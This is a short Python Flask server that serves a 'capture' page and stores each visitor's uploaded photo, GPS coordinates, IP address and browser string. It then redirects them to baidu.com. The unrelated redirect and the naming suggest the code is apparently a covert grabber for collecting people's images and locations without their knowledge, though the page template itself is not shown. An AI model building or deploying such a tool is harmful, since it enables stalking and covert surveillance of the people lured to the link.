from flask import Flask, render_template, request, redirect
import os
from datetime import datetime
import uuid
import json
import ssl

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
context.load_cert_chain('cert.pem', 'key.pem')

@app.route('/')
def index():
    return render_template('capture.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' in request.files:
        photo = request.files['photo']
        filename = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}.jpg"
        photo.save(os.path.join(UPLOAD_FOLDER, filename))
    else:
        filename = None
    
    data = {
        'photo': filename,
        'latitude': request.form.get('latitude'),
        'longitude': request.form.get('longitude'),
        'accuracy': request.form.get('accuracy'),
        'gps_timestamp': request.form.get('gps_timestamp'),
        'server_timestamp': datetime.now().isoformat(),
        'ip_address': request.remote_addr,
        'user_agent': request.user_agent.string
    }
    
    json_filename = f"data_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}.json"
    with open(os.path.join(UPLOAD_FOLDER, json_filename), 'w') as f:
        json.dump(data, f, indent=2)
    
    return redirect("https://www.baidu.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=context)